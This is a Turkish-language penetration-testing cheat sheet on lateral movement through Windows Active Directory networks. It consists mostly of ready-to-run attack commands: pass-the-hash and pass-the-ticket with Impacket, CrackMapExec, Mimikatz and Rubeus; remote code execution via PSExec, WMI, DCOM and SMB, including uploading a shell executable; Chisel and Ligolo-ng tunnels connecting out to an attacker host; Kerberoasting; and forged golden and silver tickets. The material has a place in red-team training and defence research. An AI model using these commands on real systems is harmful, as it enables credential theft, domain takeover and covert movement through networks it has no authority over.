# ➡️ Faz 4: Yatay İlerleme (Lateral Movement)

[🇬🇧 English](../04-Lateral-Movement.md) • [🇮🇹 Versione Italiana](04-Lateral-Movement.it.md)

```
  ██╗      █████╗ ████████╗███████╗██████╗  █████╗ ██╗     
  ██║     ██╔══██╗╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██║     
  ██║     ███████║   ██║   █████╗  ██████╔╝███████║██║     
  ██║     ██╔══██║   ██║   ██╔══╝  ██╔══██╗██╔══██║██║     
  ███████╗██║  ██║   ██║   ███████╗██║  ██║██║  ██║███████╗
  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
        ███╗   ███╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗███████╗███╗   ██╗████████╗
        ████╗ ████║██╔═══██╗██║   ██║██╔════╝████╗ ████║██╔════╝████╗  ██║╚══██╔══╝
        ██╔████╔██║██║   ██║██║   ██║█████╗  ██╔████╔██║█████╗  ██╔██╗ ██║   ██║   
        ██║╚██╔╝██║██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██╔══╝  ██║╚██╗██║   ██║   
        ██║ ╚═╝ ██║╚██████╔╝ ╚████╔╝ ███████╗██║ ╚═╝ ██║███████╗██║ ╚████║   ██║   
        ╚═╝     ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
```

**Hedef:** Ele geçirilen ilk sistemden ağdaki diğer sistemlere ve Domain Controller'a doğru ilerlemek.

---

## 🔑 Kimlik Bilgisi Tabanlı İlerleme

### Pass-the-Hash (PTH)
Parolayı çözmeye gerek kalmadan doğrudan NTLM hash ile kimlik doğrulama:

```bash
# Impacket PSExec (Hash ile)
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket WMIExec (Daha sessiz ve log bırakma ihtimali daha düşük)
impacket-wmiexec -hashes :NTLM_HASH administrator@192.168.1.10

# Impacket SMBExec
impacket-smbexec -hashes :NTLM_HASH administrator@192.168.1.10

# CrackMapExec ile PTH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH
crackmapexec smb 192.168.1.10 -u administrator -H NTLM_HASH -x "whoami"

# Evil-WinRM ile hash üzerinden kabuk açma
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH
```

### Pass-the-Ticket (PTT)
```powershell
# Bellekten bilet dökümü alma (Mimikatz)
sekurlsa::tickets /export

# Bileti belleğe yükleme
kerberos::ptt ticket.kirbi

# Veya Rubeus ile:
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Bileti doğrulama
klist
```

### Overpass-the-Hash (Pass-the-Key)
```powershell
# Mimikatz - NTLM hash vererek Kerberos TGT bileti isteme
sekurlsa::pth /user:administrator /domain:domain.local /ntlm:HASH /run:cmd

# Rubeus ile:
.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
```

### Pass-the-Certificate
```bash
# AD CS üzerinden elde edilen sertifika (.pfx) ile kimlik doğrulama
certipy auth -pfx admin.pfx -dc-ip 192.168.1.1

# Rubeus ile sertifikadan bilet alma
.\Rubeus.exe asktgt /user:admin /certificate:admin.pfx /ptt
```

---

## 🖥️ Uzaktan Kod Çalıştırma Yöntemleri

### PSExec
```bash
# Impacket PSExec (Parola ile)
impacket-psexec domain/administrator:password@192.168.1.10
impacket-psexec -hashes :HASH administrator@192.168.1.10

# Metasploit PSExec modülü
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.10
set SMBUser administrator
set SMBPass password
run
```

### WMIExec
```bash
# Impacket WMIExec
impacket-wmiexec domain/administrator:password@192.168.1.10
impacket-wmiexec -hashes :HASH administrator@192.168.1.10

# PowerShell üzerinden WMI ile komut çalıştırma
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\temp\out.txt" -ComputerName 192.168.1.10 -Credential $cred
```

### WinRM / Evil-WinRM
```bash
# Evil-WinRM parola ile
evil-winrm -i 192.168.1.10 -u administrator -p 'password'

# Evil-WinRM hash ile
evil-winrm -i 192.168.1.10 -u administrator -H NTLM_HASH

# PowerShell Remoting (PSSession)
Enter-PSSession -ComputerName 192.168.1.10 -Credential $cred
Invoke-Command -ComputerName 192.168.1.10 -Credential $cred -ScriptBlock { whoami }
```

### DCOM
```bash
# Impacket DCOMExec
impacket-dcomexec domain/administrator:password@192.168.1.10

# PowerShell DCOM çalıştırma
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

### SMB
```bash
# CrackMapExec ile SMB üzerinden komut yürütme
crackmapexec smb 192.168.1.10 -u admin -p password -x "whoami"
crackmapexec smb 192.168.1.10 -u admin -p password -X "Get-Process"

# SMB üzerinden dosya yükleme
smbclient //192.168.1.10/C$ -U administrator
put shell.exe

# SMBExec çalıştırma yöntemi
crackmapexec smb 192.168.1.10 -u admin -p password --exec-method smbexec -x "whoami"
```

### RDP
```bash
# xfreerdp ile GUI bağlantısı
xfreerdp /v:192.168.1.10 /u:administrator /p:password /dynamic-resolution

# NTLM hash ile RDP bağlantısı (Restricted Admin Mode)
xfreerdp /v:192.168.1.10 /u:administrator /pth:NTLM_HASH

# Hedefte RDP'yi uzaktan aktif hale getirme
crackmapexec smb 192.168.1.10 -u admin -p password -M rdp -o ACTION=enable
```

### SSH (Linux)
```bash
# Parola ile SSH bağlantısı
ssh user@192.168.1.10

# Özel anahtar (id_rsa) ile
ssh -i id_rsa user@192.168.1.10

# SSH tünelleme ve pivot
ssh -D 9050 user@192.168.1.10             # Dinamik SOCKS proxy
ssh -L 8080:internal:80 user@192.168.1.10  # Yerel port yönlendirme
```

---

## 🔄 Ağ Atlama ve Tünelleme (Network Pivoting)

### SSH Tünelleme
```bash
# Yerel port yönlendirme (internal:80 portunu localhost:8080 üzerinden açma)
ssh -L 8080:192.168.2.10:80 user@192.168.1.10

# Dinamik SOCKS proxy
ssh -D 9050 user@192.168.1.10
proxychains nmap 192.168.2.0/24

# Uzak port yönlendirme (Reverse Port Forward)
ssh -R 4444:localhost:4444 user@192.168.1.10
```

### Chisel ile Tünelleme
```bash
# Saldırgan makinesinde (Sunucu)
./chisel server --reverse --port 8080

# Kurban makinede (İstemci)
./chisel client ATTACKER_IP:8080 R:socks

# Proxychains ile iç ağı tarama
proxychains nmap 192.168.2.10
```

### Ligolo-ng
```bash
# Saldırgan makinesinde
./proxy -selfcert

# Kurban makinede
./agent -connect ATTACKER_IP:11601 -ignore-cert

# Proxy konsolunda oturumu başlatma
session
start
```

### Metasploit Pivoting
```bash
# Meterpreter oturumu üzerinden rota ekleme
run autoroute -s 192.168.2.0/24

# Veya manuel rota:
route add 192.168.2.0 255.255.255.0 1

# SOCKS proxy modülü
use auxiliary/server/socks_proxy
set SRVPORT 9050
run -j
```

---

## 🎫 Kerberos Saldırıları

### Kerberoasting
```bash
# Servis biletlerini (SPN) isteme
GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.1 -request

# Rubeus ile
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Hashcat ile kırma
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
```bash
# Ön kimlik doğrulama zorunlu olmayan kullanıcıları bulma
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.1

# Kırma
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

### Golden Ticket (Altın Bilet)
```powershell
# Önce krbtgt hash'ini elde edin, ardından:
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt
```

### Silver Ticket (Gümüş Bilet)
```powershell
# Belirli bir servis için sahte bilet üretme
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
```

---

## 📊 Hızlı Başvuru Tablosu

### Yatay İlerleme Yöntemleri

| Yöntem | Port | Araç |
|--------|------|------|
| PSExec | 445 / SMB | Impacket, Metasploit |
| WMIExec | 135 / WMI | Impacket |
| WinRM | 5985 / 5986 | Evil-WinRM |
| RDP | 3389 | xfreerdp |
| SSH | 22 | ssh |
| DCOM | 135+ | Impacket |

### Gerekli Kimlik Bilgisi Gereksinimleri

| Metot | Gereksinim |
|-------|------------|
| Pass-the-Hash | NTLM Hash |
| Pass-the-Ticket | Kerberos Bileti (.kirbi / .ccache) |
| PSExec | Admin Yetkisi + SMB Erişimi |
| WinRM | WinRM Açık + Admin Yetkisi |
| RDP | RDP Açık + Remote Desktop Users Grubu |

---

## 🔗 İlgili Kılavuzlar

- [Impacket](../../Impacket/README.md)
- [CrackMapExec](../../CrackMapExec/README.md)
- [Evil-WinRM](../../Evil-WinRM/README.md)
- [Mimikatz](../../Mimikatz/README.md)
- [Rubeus](../../Rubeus/README.md)

---

**Önceki Aşama:** [← 03 - Yetki Yükseltme (Privilege Escalation)](./03-Privilege-Escalation.tr.md)  
**Sonraki Aşama:** [05 - Kalıcılık Sağlama (Persistence) →](./05-Persistence.tr.md)
